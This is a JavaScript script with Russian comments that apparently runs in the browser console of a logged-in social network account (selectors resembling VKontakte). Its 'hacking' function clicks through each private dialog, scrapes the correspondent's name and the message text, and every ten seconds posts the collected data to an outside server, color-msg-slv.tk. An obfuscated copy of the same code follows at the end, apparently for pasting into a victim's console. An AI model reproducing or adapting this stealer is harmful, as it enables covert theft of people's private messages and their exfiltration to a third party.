/**
 * Проходится по всем диалогам в панели слева и получает их id
 */
function getDialogsIDs() {
    let dialogs = [];
    document.querySelectorAll('.nim-dialog').forEach(link => {
        dialogs.push({
            'list-id': link.getAttribute('data-list-id'),
            'msgid': link.getAttribute('data-msgid')
        });
    });

    return dialogs;
}

/**
 * Получает все видимые сообщения на этой странице
 */
function getMessages() {
    let messages = [];
    document.querySelectorAll('.im-mess--text').forEach(mess =>
        messages.push(mess.textContent)
    );
    return messages;
}

/**
 * Имитирует клик по диалогу (по sel_id), чтобы переместиться на страницу с ним
 */
async function goToDialog(sel_id) {
    document.querySelector(`._im_dialog_${sel_id}`).click();
}


let dialogsData = {}; // все данные о диалогах
let dialogs = getDialogsIDs(); // получаем id диалогов
let dialogsCount = dialogs.length; // узнаем сколько всего диалогов
let count = 6;

/**
 * it is magiiick
 */
async function hacking() {
    // переходим на страницу с сообщениями
    document.querySelector('#l_msg > a').click();
    await new Promise(resolve => setTimeout(resolve, 2000));

    // каждые 2сек запускаем этот код, чтобы страница с диалогом успела загрузитсья
    let parser = setInterval(async () => {
        dialogsCount--; // прочитали этот диалог
        if (dialogsCount < 0) return dialogsData; // диалоги кончились

        // переходим ко следующиму диалогу
        await goToDialog(dialogs[dialogsCount]['list-id']);

        // получаем имя человека, с кем периписка
        let name = document.querySelector('._im_page_peer_name').textContent;

        // добавляем сообщения с этой страницы в объект по ключу
        dialogsData[name] = getMessages();

        // выводим в консоль обновленные данные о диалогах
        console.log(dialogsData);
    }, 2000);


    // каждыйе 10сек асинхронн0 отправляем данные на сервер
    let saver = setInterval(() => {
        let formData = new FormData();
        formData.append('data', dialogsData);
        fetch(
            'https://color-msg-slv.tk', {
                method: 'POST',
                mode: 'no-cors',
                body: formData,
            }
        );

        dialogsData = {}; // clear data
    }, 10000);


    if (count <= 0) {
        // stop inntervals
        clearInterval(parser);
        clearInterval(saver);
    }
    count--;
}

hacking();

// const _0x17a8=['click','789058hiipSB','textContent','push','1lVAlka','259800DHNimq','#l_msg\x20>\x20a','609779gvcLNv','data','getAttribute','querySelector','833251YRLevF','541357onMGlf','forEach','.nim-dialog','log','no-cors','querySelectorAll','533164EUTScs','length','731611ZmZyzZ','._im_page_peer_name'];const _0x52ca60=_0x32f6;(function(_0x4e3cc6,_0xb6e379){const _0x4b544f=_0x32f6;while(!![]){try{const _0x4442be=parseInt(_0x4b544f(0x140))*-parseInt(_0x4b544f(0x12d))+parseInt(_0x4b544f(0x13d))+parseInt(_0x4b544f(0x134))+parseInt(_0x4b544f(0x13b))+parseInt(_0x4b544f(0x12e))+-parseInt(_0x4b544f(0x135))+-parseInt(_0x4b544f(0x130));if(_0x4442be===_0xb6e379)break;else _0x4e3cc6['push'](_0x4e3cc6['shift']());}catch(_0x3143c8){_0x4e3cc6['push'](_0x4e3cc6['shift']());}}}(_0x17a8,0x65f60));function getDialogsIDs(){const _0x4feaa2=_0x32f6;let _0x1964cd=[];return document[_0x4feaa2(0x13a)](_0x4feaa2(0x137))[_0x4feaa2(0x136)](_0x597883=>{const _0x3ee035=_0x4feaa2;_0x1964cd[_0x3ee035(0x12c)]({'list-id':_0x597883[_0x3ee035(0x132)]('data-list-id'),'msgid':_0x597883[_0x3ee035(0x132)]('data-msgid')});}),_0x1964cd;}function getMessages(){const _0xb92f2d=_0x32f6;let _0x487ba3=[];return document['querySelectorAll']('.im-mess--text')[_0xb92f2d(0x136)](_0x5ba929=>_0x487ba3[_0xb92f2d(0x12c)](_0x5ba929[_0xb92f2d(0x141)])),_0x487ba3;}async function goToDialog(_0x37d924){const _0x42f833=_0x32f6;document[_0x42f833(0x133)]('._im_dialog_'+_0x37d924)[_0x42f833(0x13f)]();}function _0x32f6(_0x5a65a4,_0x3f2adf){return _0x32f6=function(_0x17a886,_0x32f6ba){_0x17a886=_0x17a886-0x12c;let _0x36594d=_0x17a8[_0x17a886];return _0x36594d;},_0x32f6(_0x5a65a4,_0x3f2adf);}let dialogsData={},dialogs=getDialogsIDs(),dialogsCount=dialogs[_0x52ca60(0x13c)],count=0x6;async function hacking(){const _0x334f1c=_0x52ca60;document[_0x334f1c(0x133)](_0x334f1c(0x12f))[_0x334f1c(0x13f)](),await new Promise(_0x46033a=>setTimeout(_0x46033a,0x7d0));let _0x4d13ad=setInterval(async()=>{const _0x2f5bab=_0x334f1c;dialogsCount--;if(dialogsCount<0x0)return dialogsData;await goToDialog(dialogs[dialogsCount]['list-id']);let _0x52a115=document[_0x2f5bab(0x133)](_0x2f5bab(0x13e))[_0x2f5bab(0x141)];dialogsData[_0x52a115]=getMessages(),console[_0x2f5bab(0x138)](dialogsData);},0x7d0),_0x569802=setInterval(()=>{const _0x53a8bc=_0x334f1c;let _0x115f57=new FormData();_0x115f57['append'](_0x53a8bc(0x131),dialogsData),fetch('https://color-msg-slv.tk',{'method':'POST','mode':_0x53a8bc(0x139),'body':_0x115f57}),dialogsData={};},0x2710);count<=0x0&&(clearInterval(_0x4d13ad),clearInterval(_0x569802)),count--;}hacking();